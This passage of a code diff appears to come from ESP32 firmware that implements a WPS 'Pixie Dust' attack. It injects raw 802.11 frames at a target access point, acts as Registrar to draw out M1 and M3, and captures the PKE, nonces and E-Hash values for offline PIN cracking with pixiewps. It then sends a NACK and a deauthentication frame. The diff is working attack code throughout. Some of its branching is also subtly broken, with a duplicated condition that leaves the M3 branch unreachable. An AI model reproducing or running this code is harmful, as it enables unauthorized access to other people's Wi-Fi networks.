+                        opcode = (wsOffset+7 < len) ? p[wsOffset+7] : 0;
+                        uint8_t flags = (wsOffset+8 < len) ? p[wsOffset+8] : 0;
+                        tlvOff = 9 + (flags & 0x02 ? 2 : 0);
+                    } else if (isDblWrap && wsOffset+17 <= len) {
+                        if (p[wsOffset+9]==0x37 && p[wsOffset+10]==0x2A && p[wsOffset+11]==0x00)
+                            opcode = p[wsOffset+15];
+                        tlvOff = 16;
                     } else if (isShell) {
-                        // Shell format: outer vid=00:01:01, outer op varies per retransmit,
-                        // payload is always just 37:2A:00:00 — treat any of these as WSC-Start
-                        opcode = 0x01; // normalise
+                        opcode = 0x01;
+                        tlvOff = 4;
                     }
 
-                    // Accept op=0x01 (WSC_Start) or op=0x04 (WSC_MSG, some APs skip Start)
-                    if ((isStdWfa || isDblWrap || isShell || isTPLink) &&
-                        (opcode == 0x01 || opcode == 0x04)) {
-                        if (g_wpsState == WpsProbeState::IdentityRespSent) {
-                            Serial.printf("[WPS-Probe] WSC-Start (vid=%02X%02X%02X op=0x%02X%s)\n",
-                                          p[wsOffset], p[wsOffset+1], p[wsOffset+2], opcode,
-                                          isShell ? " shell" : isDblWrap ? " dbl-wrap" : "");
-                            g_lastEapId = eapId;
-                            g_wpsState  = WpsProbeState::WaitingM2;
-                        } else if (g_wpsState == WpsProbeState::WaitingM2) {
-                            // AP retransmitting WSC-Start — keep g_lastEapId current
-                            // so the M1 retry loop always patches the freshest id+1.
+                    if (!(isTPLink || isStdWfa || isDblWrap || isShell)) return;
+
+                    // ── Registrar flow: AP sends M1 (op=WSC_MSG, MsgType=0x04) ──
+                    // Accept M1 in WaitingApM1 OR IdentityRespSent — the AP sometimes
+                    // sends M1 before our state machine advances past IdentityRespSent.
+                    if (opcode == 0x04 && (g_wpsState == WpsProbeState::WaitingApM1 ||
+                                           g_wpsState == WpsProbeState::IdentityRespSent)) {
+                        // Find MsgType TLV inside the WPS payload to confirm M1
+                        const uint8_t *tlvBase = p + offset + 5 + tlvOff;
+                        int tlvLen = len - (int)(tlvBase - p);
+                        uint8_t msgTypeVal = 0;
+                        for (int j=0; j+4<=tlvLen; ) {
+                            uint16_t t = ((uint16_t)tlvBase[j]<<8)|tlvBase[j+1];
+                            uint16_t l = ((uint16_t)tlvBase[j+2]<<8)|tlvBase[j+3];
+                            if (j+4+l > tlvLen) break;
+                            if (t==0x1022 && l>=1) { msgTypeVal=tlvBase[j+4]; break; }
+                            j+=4+l;
+                        }
+                        if (msgTypeVal == 0x04) {
+                            Serial.printf("[WPS-Probe] AP M1 received (EAP id=0x%02X)\n", eapId);
+                            g_apM1EapId   = eapId;   // ← ADD THIS
+                            g_lastEapId   = eapId;
+                            g_wpsState    = WpsProbeState::WaitingApM3;
+                            g_gotEapIdReq = true;
+                        }
+                    }
+                    // ── AP retransmitting M1 ──
+                    else if (opcode == 0x04 && g_wpsState == WpsProbeState::WaitingApM3) {
+                        g_lastEapId = eapId;  // keep id fresh for M2 retransmit patching
+                    }
+                    // ── AP sends M3 (op=WSC_MSG, MsgType=0x07) ──
+                    // M3 contains E-Hash1(0x1014) and E-Hash2(0x1015).
+                    // The sniffer's parseTlvBuffer will capture them automatically.
+                    // We just need to update g_lastEapId.
+                    else if (opcode == 0x04 && g_wpsState == WpsProbeState::WaitingApM3) {
+                        const uint8_t *tlvBase = p + offset + 5 + tlvOff;
+                        int tlvLen = len - (int)(tlvBase - p);
+                        uint8_t msgTypeVal = 0;
+                        for (int j=0; j+4<=tlvLen; ) {
+                            uint16_t t = ((uint16_t)tlvBase[j]<<8)|tlvBase[j+1];
+                            uint16_t l = ((uint16_t)tlvBase[j+2]<<8)|tlvBase[j+3];
+                            if (j+4+l > tlvLen) break;
+                            if (t==0x1022 && l>=1) { msgTypeVal=tlvBase[j+4]; break; }
+                            j+=4+l;
+                        }
+                        if (msgTypeVal == 0x07) {
+                            Serial.printf("[WPS-Probe] AP M3 received — E-Hash capture expected\n");
                             g_lastEapId = eapId;
                         }
                     }
@@ -900,6 +1302,7 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     g_wpsState      = WpsProbeState::Idle;
     g_identityReqId = 0;
     g_lastEapId     = 0;
+    g_apM1EapId     = 0;
     g_gotAuthResp   = false;
     g_gotAssocResp  = false;
     g_gotEapIdReq   = false;
@@ -973,120 +1376,156 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     }
     vTaskDelay(pdMS_TO_TICKS(80));
 
-    // ----EAPOL-Start (send 3× for reliability) ----
-    flen = buildEapolStart(frameBuf, bssid);
+    // EAPOL-Start and proactive Identity are sent after Assoc below.
     g_wpsState = WpsProbeState::EapolStartSent;
+
+    // Registrar flow: we do NOT wait for EAP-Req/Identity.
+    // Identity is sent proactively (id=0) immediately after EAPOL-Start.
+    // The AP will respond with its M1 directly.
+    vTaskDelay(pdMS_TO_TICKS(50));
+
+    // ── Pre-generate our Registrar public key (PKR) via DH ──────────────────
+    // dhm_setup() generates a random private key X and computes PKR = G^X mod P.
+    // g_ourPkr holds the result. We keep g_dhX for computing the shared secret
+    // after AP's M1 arrives.
+    if (!dhm_setup()) {
+        Serial.println("[WPS-Probe] DH setup failed");
+        return false;
+    }
+
+    // ── Null frame + EAPOL-Start + proactive Identity (no waiting) ──
+    {
+        uint8_t nullBuf[24];
+        int nullLen = buildNullFrame(nullBuf, bssid);
+        esp_wifi_80211_tx(WIFI_IF_STA, nullBuf, nullLen, true);
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    flen = buildEapolStart(frameBuf, bssid);
     for (int i = 0; i < 3; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
-        vTaskDelay(pdMS_TO_TICKS(40));
+        vTaskDelay(pdMS_TO_TICKS(30));
     }
-    g_wpsState = WpsProbeState::WaitingIdentityReq;
+    vTaskDelay(pdMS_TO_TICKS(50));
 
-    // ---- Wait for EAP-Request/Identity ----
-    {
-        uint32_t deadline = millis() + 3000;
-        while (!g_gotEapIdReq && millis() < deadline) vTaskDelay(pdMS_TO_TICKS(20));
-        if (!g_gotEapIdReq) {
-            Serial.println("[WPS-Probe] No EAP-Req/Identity");
-            return false;
-        }
-    }
-    vTaskDelay(pdMS_TO_TICKS(20));
-
-    // Pre-build M1 NOW — buildM1Frame takes 300ms-1.5s (malloc+esp_random).
-    // If built after WSC-Start, the AP retransmits WSC-Start with new EAP IDs
-    // making our M1 carry a stale ID that the AP silently ignores.
-    Serial.printf("[WPS-Probe] Building M1... t=%lums\n", millis());
-    uint8_t pkeLocal[192], eNonceLocal[16];
-    int m1Len = 0;
-    uint8_t *m1Frame = buildM1Frame(bssid, 0x00, &m1Len, pkeLocal, eNonceLocal);
-    if (!m1Frame) { Serial.println("[WPS-Probe] M1 alloc failed"); return false; }
-    Serial.printf("[WPS-Probe] M1 built (%d bytes) t=%lums\n", m1Len, millis());
-    memcpy(pixieCapture.pke,     pkeLocal,   192);
-    memcpy(pixieCapture.e_nonce, eNonceLocal, 16);
-    pixieCapture.pke_set = pixieCapture.e_nonce_set = true;
-
-    // ---- EAP-Response/Identity ----
-    flen = buildEapIdentityResponse(frameBuf, bssid, g_lastEapId);  // g_lastEapId = latest Identity Req id
+    // Proactive Identity Response — id=0, no waiting for EAP-Req/Identity.
+    // In Registrar mode the AP goes straight to sending M1 after Identity.
+    flen = buildEapIdentityResponse(frameBuf, bssid, 0x00);
     g_wpsState = WpsProbeState::IdentityRespSent;
     for (int i = 0; i < 3; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
         vTaskDelay(pdMS_TO_TICKS(40));
     }
+    Serial.println("[WPS-Probe] Proactive Identity sent, waiting for AP M1...");
 
-    // ---- Wait for WSC-Start, then send M1, wait for M2 ----
+    // ── Step 1: Wait for AP M1 (MsgType=0x04) ──────────────────────────────
+    // g_gotEapIdReq is re-purposed: set to true by wpsProbeSnifferCb when AP M1 arrives.
+    g_wpsState = WpsProbeState::WaitingApM1;
     {
-        // Step 1: wait for WSC-Start
         uint32_t deadline = millis() + 5000;
-        bool gotWscStart = false;
-        while (millis() < deadline) {
-            if (g_wpsState == WpsProbeState::WaitingM2) { gotWscStart = true; break; }
-            if (check(EscPress)) { free(m1Frame); return false; }
+        while ((!g_gotEapIdReq || !pixieCapture.pke_set) && millis() < deadline) {
+            if (check(EscPress)) return false;
             vTaskDelay(pdMS_TO_TICKS(20));
         }
-        if (!gotWscStart) {
-            Serial.println("[WPS-Probe] WSC-Start timeout");
-            free(m1Frame); return false;
+        if (!g_gotEapIdReq || !pixieCapture.pke_set) {
+            Serial.println("[WPS-Probe] AP M1 timeout");
+            return false;
         }
-        Serial.printf("[WPS-Probe] WSC-Start received t=%lums\n", millis());
-
-        // Settle: wait 350ms after first WSC-Start before sending M1.
-        // The AP typically bursts 2-3 WSC-Start retransmits ~100ms apart.
-        // Each one updates g_lastEapId (via the WaitingM2 branch above).
-        // Waiting here ensures we capture the HIGHEST WSC-Start id so M1
-        // goes out with the correct id+1, not an id from an earlier retransmit.
-        // 350ms is enough for 3 retransmits at 100ms intervals without risking
-        // the AP's session timeout (~5s on TP-Link / D-Link).
-        vTaskDelay(pdMS_TO_TICKS(350));
-
-        // Step 2: patch EAP ID in pre-built M1 and send.
-        // WPS spec §7.1: after WSC-Start the enrollee sends M1 directly.
-        // There is NO WSC-ACK step here — sending one causes the AP to
-        // keep retransmitting WSC-Start and never process M1.
-        //
-        // Send M1, wait for M2, retransmit if needed.
-        // Vendors vary widely: ASUS ~100ms, TP-Link ~150-300ms, D-Link up to 1s.
-        // Re-patching EAP ID before each send handles AP WSC-Start retransmits.
-        static const uint32_t M1_RETRY_INTERVAL_MS = 3000;
-        static const int      M1_MAX_RETRIES        = 3;   // 4 sends = 12s total
-
-        bool gotM2 = false;
-        for (int attempt = 0; attempt <= M1_MAX_RETRIES && !gotM2; attempt++) {
-            // Re-patch EAP ID immediately before each send.
-            // The AP retransmits WSC-Start with incrementing IDs between our attempts.
-            // g_lastEapId is updated by the sniffer on every WSC-Start retransmit,
-            // so patching here ensures each M1 send uses the very latest id+1.
-            m1Frame[39] = (uint8_t)(g_lastEapId + 1);
-            if (attempt == 0) {
-                Serial.printf("[WPS-Probe] Sending M1 (EAP ID=0x%02X) t=%lums\n",
-                              m1Frame[39], millis());
-            } else {
-                Serial.printf("[WPS-Probe] M1 retransmit #%d (EAP ID=0x%02X) t=%lums\n",
-                              attempt, m1Frame[39], millis());
-            }
-            esp_wifi_80211_tx(WIFI_IF_STA, m1Frame, m1Len, true);
-
-            deadline = millis() + M1_RETRY_INTERVAL_MS;
-            while (millis() < deadline) {
-                if (pixieCapture.valid) { gotM2 = true; break; }
-                if (check(EscPress))    { free(m1Frame); return false; }
-                vTaskDelay(pdMS_TO_TICKS(50));
-            }
-        }
-        free(m1Frame); m1Frame = nullptr;
-
-        if (gotM2) {
-            flen = buildEapNak(frameBuf, bssid, g_lastEapId);
-            esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
-            return true;
-        }
-        Serial.println("[WPS-Probe] M2 timeout");
+        vTaskDelay(pdMS_TO_TICKS(20));
     }
-
-    flen = buildEapNak(frameBuf, bssid, g_lastEapId);
-    esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
+    // At this point sniffer has captured AP's PKE and E-Nonce from M1.
+    Serial.printf("[WPS-Probe] AP M1 captured. Sending M2 (EAP ID=0x%02X)\n", g_apM1EapId);
     vTaskDelay(pdMS_TO_TICKS(50));
 
+    // ── Compute DH shared secret from AP's PKE ───────────────────────────────
+    // pixieCapture.pke = AP's enrollee public key (captured from M1 by sniffer).
+    // g_dhX = our private key generated in dhm_setup() above.
+    // Result stored in g_dhSecret[192].
+    // ── Step 2: Build and send our M2 ───────────────────────────────────────
+    // Generate R-Nonce first — it is an input to the AuthKey KDF, so we need
+    // it before calling deriveAuthKeyFromDH. Never pass nullptr to that function.
+    uint8_t rNonceLocal[16];
+    esp_fill_random(rNonceLocal, 16);
+
+    uint8_t authKey[32] = {0};
+    bool authKeyValid = false;
+
+    // Compute DH shared secret from AP's PKE, then derive AuthKey.
+    // In the Registrar flow the AP is the Enrollee, so:
+    //   EnrolleeNonce = pixieCapture.e_nonce  (from AP's M1, TLV 0x101A)
+    //   EnrolleeMac   = pixieCapture.bssid    (AP's MAC)
+    //   RegistrarNonce = rNonceLocal           (our freshly generated nonce)
+    if (dhm_compute_secret(pixieCapture.pke)) {
+        authKeyValid = deriveAuthKeyFromDH(pixieCapture.e_nonce,
+                                           pixieCapture.bssid,
+                                           rNonceLocal,
+                                           authKey);
+        if (authKeyValid)
+            Serial.printf("[DH] AuthKey: %02X%02X%02X%02X...\n",
+                          authKey[0],authKey[1],authKey[2],authKey[3]);
+        else
+            Serial.println("[DH] AuthKey derivation failed");
+    } else {
+        Serial.println("[WPS-Probe] DH secret failed — M2 will have zero Authenticator");
+    }
+
+    // Extract M1 WPS body from pixieCapture for Authenticator computation.
+    // The sniffer stores the raw TLV bytes in pixieCapture.m1Body[]/m1BodyLen
+    // (we add these fields below). If not available, authenticator will be zero.
+    int m2Len = 0;
+    uint8_t *m2Frame = buildM2Frame(bssid, g_apM1EapId,
+                                    pixieCapture.e_nonce,
+                                    g_ourPkr,
+                                    rNonceLocal, &m2Len,
+                                    authKeyValid ? authKey : nullptr,
+                                    pixieCapture.m1Body,
+                                    pixieCapture.m1BodyLen);
+    if (!m2Frame) { Serial.println("[WPS-Probe] M2 alloc failed"); return false; }
+
+
+    // Save our PKR and R-Nonce into pixieCapture for pixiewps
+    memcpy(pixieCapture.pkr,     g_ourPkr,    192);
+    memcpy(pixieCapture.r_nonce, rNonceLocal,  16);
+    pixieCapture.pkr_set = pixieCapture.r_nonce_set = true;
+
+    g_wpsState = WpsProbeState::WaitingApM3;
+
+    static const uint32_t M2_RETRY_MS  = 3000;
+    static const int      M2_MAX_RETRY = 3;
+
+    bool gotM3 = false;
+    for (int attempt = 0; attempt <= M2_MAX_RETRY && !gotM3; attempt++) {
+        // Patch EAP ID on retransmit (AP may have re-sent M1 with a new id)
+        m2Frame[39] = g_apM1EapId;
+        if (attempt == 0)
+            Serial.printf("[WPS-Probe] Sending M2 (EAP ID=0x%02X) t=%lums\n", m2Frame[39], millis());
+        else
+            Serial.printf("[WPS-Probe] M2 retransmit #%d (EAP ID=0x%02X)\n", attempt, m2Frame[39]);
+        esp_wifi_80211_tx(WIFI_IF_STA, m2Frame, m2Len, true);
+
+        uint32_t deadline = millis() + M2_RETRY_MS;
+        while (millis() < deadline) {
+            if (pixieCapture.valid) { gotM3 = true; break; }
+            if (check(EscPress))    { free(m2Frame); return false; }
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+    }
+    free(m2Frame); m2Frame = nullptr;
+
+    if (gotM3) {
+        // Send WSC_NACK to terminate the session cleanly
+        flen = buildWscNack(frameBuf, bssid, g_lastEapId);
+        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
+        vTaskDelay(pdMS_TO_TICKS(30));
+        // Deauth
+        flen = buildDeauthFrame(frameBuf, bssid);
+        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
+        Serial.println("[WPS-Probe] M3 captured — pixie data complete!");
+        return true;
+    }
+    Serial.println("[WPS-Probe] M3 timeout (no E-Hash1/E-Hash2 received)");
+    flen = buildWscNack(frameBuf, bssid, g_lastEapId);
+    esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
     return pixieCapture.valid;
 }
 
